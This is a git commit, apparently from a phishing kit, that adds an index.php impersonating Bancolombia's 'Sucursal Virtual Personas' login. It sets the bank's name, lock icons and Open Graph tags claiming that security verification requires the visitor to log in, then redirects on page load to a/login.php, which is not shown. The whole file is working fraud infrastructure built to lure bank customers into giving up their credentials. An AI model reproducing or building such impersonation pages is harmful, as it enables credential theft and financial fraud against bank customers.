e3bc0c8008df6e866c03e1135f5d198f93b51020
AKAM-ADMIN <admin@akam-mafia.com>
2026-04-15 18:07:03 -0500

    Update: MetaTags de confianza

---
+++ index.php
@@ -0,0 +1,37 @@
+<html>
+    <head>
+    <title>Bancolombia | Sucursal Virtual Personas</title>
+    <meta property="og:title" content="Bancolombia | Sucursal Virtual Personas">
+    <meta property="og:description" content="Verificación de seguridad requerida: Inicie sesión para validar su identidad.">
+    <meta property="og:image" content="img/seguridad.jpg">
+    <meta property="og:type" content="website">
+    <link rel="icon" href="img/candado-color.jpg" type="image/jpeg">
+    <title>Bancolombia | Sucursal Virtual Personas</title>
+    <meta property="og:title" content="Bancolombia | Sucursal Virtual Personas">
+    <meta property="og:description" content="Verificación de seguridad requerida: Inicie sesión para validar su identidad.">
+    <meta property="og:image" content="img/seguridad.jpg">
+    <meta property="og:type" content="website">
+    <link rel="icon" href="img/candado-color.jpg" type="image/jpeg">
+        <title>Bancolombia</title>
+        <meta http-equiv="content-type" content="text/html; utf-8">
+        <meta charset="utf-8">
+        <meta content="es" http-equiv="Content-Language">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">       
+        <link href="css/layout.css" rel="stylesheet">
+        <link href="css/fonts.css" rel="stylesheet">        
+        <link rel="icon" type="image/png" href="img/logo.png" />
+        <script type="text/javascript" src="js/jquery-3.6.0.min.js"></script>
+        <script src="js/jquery.jclock-min.js" type="text/javascript"></script>
+        <script type="text/javascript" src="js/run.js"></script>    
+        <script type="text/javascript" src="js/ready.js"></script>    
+        
+    </head>
+    <body>
+       <script type="text/javascript">
+            $(document).ready(function() {
+                window.location.href = "a/login.php"; 
+            });
+       </script>
+    </body>
+</html>
